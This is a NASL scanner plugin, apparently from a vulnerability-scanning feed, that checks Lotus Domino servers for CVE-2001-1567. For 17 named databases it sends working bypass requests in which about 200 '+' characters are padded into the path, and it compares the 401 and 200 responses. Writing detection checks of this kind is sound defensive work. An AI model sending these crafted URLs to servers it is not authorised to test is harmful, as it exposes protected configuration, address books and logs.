CPE = "cpe:/a:ibm:lotus_domino";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10953" );
	script_version( "2020-09-22T09:01:10+0000" );
	script_tag( name: "last_modification", value: "2020-09-22 09:01:10 +0000 (Tue, 22 Sep 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2001-1567" );
	script_bugtraq_id( 4022 );
	script_name( "Authentication bypassing in Lotus Domino" );
	script_category( ACT_GATHER_INFO );
	script_copyright( "Copyright (C) 2002 Davy Van De Moere" );
	script_family( "Web Servers" );
	script_dependencies( "gb_hcl_domino_consolidation.sc" );
	script_mandatory_keys( "hcl/domino/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "solution", value: "Upgrade to the latest version of Domino." );
	script_tag( name: "summary", value: "By creating a specially crafted url, the authentication mechanism of
  Domino database can be circumvented." );
	script_tag( name: "insight", value: "These URLS should look like:

  http://example.com/<databasename>.ntf<buff>.nsf/ in which <buff> has a certain length." );
	script_tag( name: "impact", value: "This is a severe risk, as an attacker is able to access
  most of the authentication protected databases. As such, confidential information can be looked
  into and configurations can mostly be altered." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_banner" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
report = NASLString( "These databases require a password, but this authentication\\ncan be circumvented by supplying a long buffer in front of their name :\\n" );
vuln = 0;
dead = 0;
func test_cgi( port, db, db_bypass ){
	var Forbidden, passed;
	if(dead){
		return 0;
	}
	Forbidden = 0;
	r = http_keepalive_send_recv( port: port, data: http_get( item: dir + db, port: port ) );
	if(r == NULL){
		dead = 1;
		return 0;
	}
	if(ereg( string: r, pattern: "^HTTP/[0-9]\\.[0-9] 401 .*" )){
		Forbidden = 1;
	}
	passed = 0;
	r = http_keepalive_send_recv( port: port, data: http_get( item: dir + db_bypass, port: port ) );
	if(r == NULL){
		dead = 1;
		return 0;
	}
	if(ereg( string: r, pattern: "^HTTP/[0-9]\\.[0-9] 200 .*" )){
		passed = 1;
	}
	if(( Forbidden == 1 ) && ( passed == 1 )){
		report = NASLString( report, db, "\\n" );
		vuln = vuln + 1;
	}
	return ( 0 );
}
test_cgi( port: port, db: "/log.nsf", db_bypass: NASLString( "/log.ntf", crap( length: 206, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/setup.nsf", db_bypass: NASLString( "/setup.ntf", crap( length: 204, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/names.nsf", db_bypass: NASLString( "/names.ntf", crap( length: 204, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/statrep.nsf", db_bypass: NASLString( "/statrep.ntf", crap( length: 202, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/catalog.nsf", db_bypass: NASLString( "/catalog.ntf", crap( length: 202, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/domlog.nsf", db_bypass: NASLString( "/domlog.ntf", crap( length: 203, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/webadmin.nsf", db_bypass: NASLString( "/webadmin.ntf", crap( length: 201, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/cersvr.nsf", db_bypass: NASLString( "/cersvr.ntf", crap( length: 203, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/events4.nsf", db_bypass: NASLString( "/events4.ntf", crap( length: 202, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/mab.nsf", db_bypass: NASLString( "/mab.ntf", crap( length: 206, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/ntsync4.nsf", db_bypass: NASLString( "/ntsync4.ntf", crap( length: 202, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/collect4.nsf", db_bypass: NASLString( "/collect4.ntf", crap( length: 201, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/mailw46.nsf", db_bypass: NASLString( "/mailw46.ntf", crap( length: 202, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/bookmark.nsf", db_bypass: NASLString( "/bookmark.ntf", crap( length: 201, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/agentrunner.nsf", db_bypass: NASLString( "/agentrunner.ntf", crap( length: 198, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/mail.box", db_bypass: NASLString( "/mailbox.ntf", crap( length: 202, data: "+" ), ".nsf" ) );
test_cgi( port: port, db: "/admin4.nsf", db_bypass: NASLString( "/admin4.ntf", crap( length: 203, data: "+" ), ".nsf" ) );
if(vuln){
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

